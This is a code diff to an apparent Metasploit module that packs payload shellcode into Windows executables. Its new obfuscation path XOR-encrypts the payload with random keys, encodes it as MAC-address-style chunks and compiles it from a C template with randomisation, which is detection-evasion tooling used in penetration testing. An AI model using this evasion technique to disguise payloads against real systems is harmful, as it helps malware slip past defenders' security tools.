@@ -4,10 +4,8 @@ require 'metasploit/framework/compiler/windows'
 require 'metasploit/framework/compiler/custom'
 
 module Msf::Obfluscation::ExeTemplate
-  
 
   def self.mac_obfluscate(payload)
-   # binding.pry
     bytes = payload.bytes
     # Pad to a multiple of 4 bytes
     remainder = bytes.length % 6
@@ -19,16 +17,14 @@ module Msf::Obfluscation::ExeTemplate
     chunks = []
     i = 0
     bytes.each_slice(6) do |quad|
-      #binding.pry if i == 11
       chunks << quad.map { |b| format('%02X', b) }.join('-')
       i = i+1
     end
     chunks
   end
-
-  def self.exe_template_compile(framework, code, opts)
-    template_path = framework.datastore['EXE::Template::Dynamic::CustomTemplate']
-    template_path ||= File.join(Msf::Config.data_directory, 'templates','template_x64_windows_xor_mac.erb')
+  
+  def self.exe_template_obfuscate_compile(framework, code, opts)
+    template_path = File.join(Msf::Config.data_directory, 'templates','template_x64_windows_xor_mac.erb')
 
     encryption_rounds = rand(2...10)
     xor_keys = encryption_rounds.times.map{ rand(256) }
@@ -55,17 +51,26 @@ module Msf::Obfluscation::ExeTemplate
     template = ERB.new(File.read(template_path))
     source_c = template.result(binding)
       
-    return Metasploit::Framework::Compiler::Custom.compile_c(source_c, :exe)
-    
-    case framework.datastore['EXE::Template::Dynamic::Compiler']
-    when nil, 'metasm'
-      return Metasploit::Framework::Compiler::Windows.compile_c(source_c, :exe,Metasm::X86_64.new)
-    when 'msfcompile'
-      return Metasploit::Framework::Compiler::Custom.compile_c(source_c, :exe)
-    else
-      raise "Unknown compiler: #{opts['EXE::Template::Dynamic::Compiler']}"
-    end
-
+    Metasploit::Framework::Compiler::Custom.compile_random_c(source_c, :exe)
   end
+
+  def self.exe_template_compile(framework, code, opts)
+    template_path = File.join(Msf::Config.data_directory, 'templates','template_x64_windows.erb')
+
+    payload = code.bytes.map { |b| "\\x%02x" % b }.join
+    payload_length = payload.length
+    
+    template = ERB.new(File.read(template_path))
+    source_c = template.result(binding)
+      
+    Metasploit::Framework::Compiler::Custom.compile_c(source_c, :exe)
+  end
+  
+
+  def self.exe_template(framework, code, opts)
+    return exe_template_obfuscate_compile(framework, code, opts) if opts[:dynamic_obfuscation]
+    exe_template_compile(framework, code, opts)
+  end
+
 
 end
